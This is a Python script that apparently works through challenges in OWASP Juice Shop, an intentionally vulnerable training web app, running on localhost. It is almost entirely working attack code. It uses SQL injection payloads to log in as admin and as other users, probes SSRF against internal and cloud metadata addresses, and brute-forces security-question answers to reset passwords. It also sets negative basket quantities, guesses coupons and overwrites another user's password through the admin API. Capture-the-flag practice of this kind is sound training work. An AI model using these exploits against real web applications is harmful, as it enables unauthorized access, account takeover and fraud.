#!/usr/bin/env python3
import json, urllib.request, urllib.error
B="http://localhost:3000"
def req(m,p,d=None,t=None,extra=None,cookie=None):
    h={}
    if t:h["Authorization"]="Bearer "+t
    if extra:h.update(extra)
    if cookie:h["Cookie"]=cookie
    b=None
    if d is not None:
        b=json.dumps(d).encode() if not isinstance(d,(bytes,str)) else (d if isinstance(d,bytes) else d.encode())
        h["Content-Type"]="application/json"
    r=urllib.request.Request(B+p,data=b,headers=h,method=m)
    try:
        x=urllib.request.urlopen(r); return x.status,x.read().decode("utf-8","replace"),dict(x.headers)
    except urllib.error.HTTPError as e: return e.code,e.read().decode("utf-8","replace"),dict(e.headers)
    except Exception as e: return -1,str(e),{}
def j(m,p,d=None,t=None,**kw):
    s,t2,h=req(m,p,d,t,**kw)
    try: return s,json.loads(t2),h
    except Exception: return s,t2,h
def tok(e,pw="x"):
    s,d,_=j("POST","/rest/user/login",{"email":e,"password":pw})
    try:return d["authentication"]["token"]
    except:return None
def email_of(t):
    try:
        import base64
        p=t.split(".")[1]; p+="="*(-len(p)%4)
        return json.loads(base64.urlsafe_b64decode(p))["data"]["email"]
    except Exception as e: return str(e)

admin=tok("' or 1=1--")
# Login Bender verify which account
bt=tok("' or email='bender@juice-sh.op'--")
print("bender token email:", email_of(bt) if bt else None)
# GDPR token email
gt=tok("' or email='chris.pike@juice-sh.op'--")
print("gdpr token email:", email_of(gt) if gt else None)

# Password Hash Leak: whoami with cookie
s,d,_=req("GET","/rest/user/whoami",cookie=f"token={admin}")
print("whoami cookie:",s,str(d)[:300])
s,d,_=req("GET","/rest/user/whoami",extra={"Cookie":f"token={admin}"})
print("whoami cookie2:",s,str(d)[:300])
# authentication-details
s,d,_=j("GET","/rest/user/authentication-details/",t=admin)
print("authdet:",s,str(d)[:200])
s,d,_=j("GET","/rest/user/authentication-details",t=admin)
print("authdet2:",s,str(d)[:200])

# Payback: inspect basket item structure
s,d,_=j("GET","/rest/basket/1",t=admin)
print("basket:",str(d)[:400])
# try adding then updating quantity via PUT with different bodies
s,d,_=j("POST","/api/BasketItems",{"ProductId":2,"BasketId":1,"quantity":1},t=admin)
print("additem:",s,str(d)[:200])
if s in (200,201) and isinstance(d,dict):
    bid=d.get("data",{}).get("id")
    for qty in [-5,-100,0]:
        s2,d2,_=j("PUT",f"/api/BasketItems/{bid}",{"quantity":qty},t=admin)
        print("upd qty",qty,s2,str(d2)[:150])
# checkout
s,d,_=j("POST","/rest/basket/1/checkout",{"orderDetails":[{"productId":1,"quantity":1,"basketItemId":1}],"couponData":None,"addressId":"1","deliveryMethodId":"1"},t=admin)
print("checkout:",s,str(d)[:200])

# Christmas: add product 10 to basket anyway
s,d,_=j("POST","/api/BasketItems",{"ProductId":10,"BasketId":1,"quantity":1},t=admin)
print("xmas add10:",s,str(d)[:200])
for pid in [9,10,11,12,13,25,26,27]:
    s,d,_=j("GET",f"/api/Products/{pid}")
    if s==200: print("prod",pid,str(d.get("data",{}).get("name")))

# Bjoern gmail security question + reset Zaya
s,d,_=j("GET","/rest/user/security-question?email=bjoern.kimminich@gmail.com")
print("gmail q:",s,str(d)[:200])
for em in ["bjoern.kimminich@gmail.com","bjoern@juice-sh.op"]:
    for a in ["Zaya","zaya","147852","12345"]:
        s,d,_=j("POST","/rest/user/reset-password",{"email":em,"answer":a,"new":"Pwned1!","repeat":"Pwned1!"})
        if s==200: print("RESET OK",em,a,str(d)[:150])
        else: print("reset",em,a,s)

# SSRF retries
for url in ["http://localhost:3000/metrics","http://127.0.0.1:3000/rest/admin/application-version","http://169.254.169.254/latest/meta-data","http://localhost:3000/ftp/acquisitions.md"]:
    s,d,_=j("POST","/profile/image/url",{"image":url},t=admin)
    print("SSRF",url,"->",s,str(d)[:120])

# Missing Encoding: cat photo guesses
for p in ["/assets/public/images/uploads/cat.jpg","/assets/public/images/uploads/cat.png",
          "/assets/public/images/products/cat.jpg","/assets/public/images/uploads/juicy_cat.jpg",
          "/assets/public/images/uploads/bjoern.jpg","/assets/public/images/uploads/cat_melee.jpg",
          "/rest/products/1/image","/ftp/cat.jpg"]:
    s,t,_=req("GET",p)
    print("CAT",p,s,len(t))

# Expired coupon guesses via checkout coupon endpoint
for code in ["expired","GWD7AM3A3Q0O1S3M","OWASP10","JAN10","FEB10"]:
    s,d,_=j("PUT",f"/rest/basket/1/coupon/{code}",t=admin)
    print("coupon",code,s,str(d)[:120])

# Change Bender via admin API
s,d,_=j("PUT","/api/Users/3",{"password":"slurmCl4ssic","passwordRepeat":"slurmCl4ssic"},t=admin)
print("changeBender api:",s,str(d)[:150])

# Complaints endpoint for typosquat/leaked key (later)
s,d,_=j("GET","/api/Complaints",t=admin)
print("complaints:",s,str(d)[:200])

s,t2,_=j("GET","/api/Challenges/")
solved={c["name"] for c in t2["data"] if c.get("solved")}
print("SOLVED",len(solved))
for n in sorted(solved):print(" +",n)
